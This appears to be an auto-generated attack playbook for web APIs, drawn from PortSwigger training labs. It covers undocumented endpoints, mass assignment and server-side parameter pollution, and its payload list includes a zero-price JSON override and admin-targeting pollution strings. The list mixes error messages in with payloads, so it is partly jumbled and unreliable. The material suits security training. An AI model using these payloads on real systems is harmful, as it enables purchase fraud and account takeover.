## API Playbook
*Synthesized from 5 PortSwigger labs*

### Overview
This playbook covers 5 known attack techniques for api.

### Attack Techniques

**General:**
- Exploiting an API endpoint using documentation
- Exploiting a mass assignment vulnerability
- Finding and exploiting an unused API endpoint
- Exploiting server-side parameter pollution in a query string
- Exploiting server-side parameter pollution in a REST URL

### Key Payloads
```
{"price":0}
&x=y
/api
Invalid username
/static/js/forgotPassword.js
Field not specified
field
Content-Type
administratorx
price
administrator#
/user
username=administrator%26field=x%23
application/json
Invalid route
&field=x#
administrator%23
{
    "chosen_discount":{
        "percentage":0
    },
    "chosen_products":[
        {
            "product_id":"1",
            "quantity":1
        }
    ]
}
administrator?
DELETE
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

